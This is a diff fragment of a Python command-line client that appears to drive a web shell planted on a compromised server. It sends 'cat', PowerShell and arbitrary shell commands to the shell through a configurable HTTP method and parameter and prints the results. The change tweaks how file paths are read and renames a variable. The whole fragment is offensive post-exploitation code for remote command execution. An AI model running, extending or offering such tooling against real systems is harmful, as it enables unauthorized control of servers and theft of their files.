@@ -99,15 +99,19 @@ try:
                             print (colored(content, "yellow"))
                       else:
                          if "cat" in command.split()[0]:
-                            content = send_command("cat " + path.rstrip() + slash + command.split()[1], WEBSHELL, HTTP_METHOD, PARAM)
-                            print (colored(content, "yellow"))
+                            if slash in command or "-" in command:
+                               content = send_command("cat " + command.split()[1], WEBSHELL, HTTP_METHOD, PARAM)
+                               print (colored(content, "yellow"))
+                            else:
+                               content = send_command("cat " + path.rstrip() + slash + command.split()[1], WEBSHELL, HTTP_METHOD, PARAM)
+                               print (colored(content, "yellow"))
                          else:
                             if args.ps:
-                               result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
-                               print (colored(result, "yellow"))
+                               content = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
+                               print (colored(content, "yellow"))
                             else:
-                               result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                               print (colored(result, "yellow"))
+                               content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
+                               print (colored(content, "yellow"))
 
        except KeyboardInterrupt:
           print (colored("\nExiting..\n", "red"))
